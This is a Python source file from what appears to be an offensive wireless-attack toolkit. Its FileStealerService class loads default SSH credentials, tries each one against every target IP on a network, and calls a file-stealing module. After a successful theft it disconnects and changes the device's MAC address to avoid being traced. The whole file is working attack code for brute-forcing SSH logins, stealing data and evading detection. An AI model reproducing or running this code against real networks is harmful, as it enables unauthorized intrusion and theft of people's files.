import os
import time
import threading
from attacks.file_stealer import FileStealer
from utils.logger import Logger

# Maximum seconds to spend attempting file theft on a single IP
IP_TIMEOUT = 30

class FileStealerService:
    def __init__(self, wifi_service, logger=None, creds_path="config/ssh_default_credentials.txt"):
        self.logger = logger or Logger(log_file="logs/scan.log")
        self.wifi_service = wifi_service
        self.stealer = FileStealer(logger=self.logger)
        self.creds = self._load_credentials(creds_path)

    def _load_credentials(self, path):
        creds = []
        for p in (path, "/root/ssh_default_credentials.txt"):
            if os.path.exists(p):
                with open(p, encoding="utf-8", errors="replace") as f:
                    for line in f:
                        parts = line.strip().split(":", 1)
                        if len(parts) == 2:
                            creds.append({"username": parts[0], "password": parts[1]})
                break
        self.logger.log(f"[INFO] Loaded {len(creds)} SSH credential(s).")
        return creds

    def _try_steal_ip(self, ip, os_type, result_holder, stop_event):
        """
        Try every credential against `ip` until one succeeds or stop_event is set.
        Stores True in result_holder[0] on success.
        """
        for cred in self.creds:
            if stop_event.is_set():
                return
            ok = self.stealer.steal_files(
                target_ip=ip,
                username=cred["username"],
                password=cred["password"],
                os_type=os_type
            )
            if ok:
                result_holder[0] = True
                return

    def steal(self, targets, ssid="unknown"):
        succeeded = []

        for t in targets:
            ip      = t["ip"]
            os_type = t.get("os_version") or "unknown"

            self.logger.activity(
                "file_steal", ssid,
                f"Attempting file steal on {ip} (timeout {IP_TIMEOUT}s)...",
                status="running"
            )

            result_holder = [False]
            stop_event    = threading.Event()

            worker = threading.Thread(
                target=self._try_steal_ip,
                args=(ip, os_type, result_holder, stop_event),
                daemon=True
            )
            worker.start()
            worker.join(timeout=IP_TIMEOUT)

            # Signal the worker to stop trying more credentials
            stop_event.set()

            if result_holder[0]:
                succeeded.append(ip)
                self.logger.log(f"[SUCCESS] File stealing successful for IP: {ip}.")
                self.logger.activity(
                    "file_steal", ssid,
                    f"Files stolen from {ip}",
                    status="success",
                    details={"ip": ip}
                )
                iface = getattr(self.wifi_service.manager, "interface", "wlan0") or "wlan0"
                self.wifi_service.disconnect()
                self.wifi_service.change_mac(interface=iface)
                time.sleep(1)
            else:
                timed_out = worker.is_alive()
                reason    = "timed out" if timed_out else "no credentials matched"
                self.logger.log(f"[INFO] File steal skipped for {ip}: {reason}.")
                self.logger.activity(
                    "file_steal", ssid,
                    f"No files stolen from {ip} ({reason})",
                    status="error"
                )

        self.logger.log(f"[INFO] File stealing succeeded on {len(succeeded)} host(s).")
        return succeeded
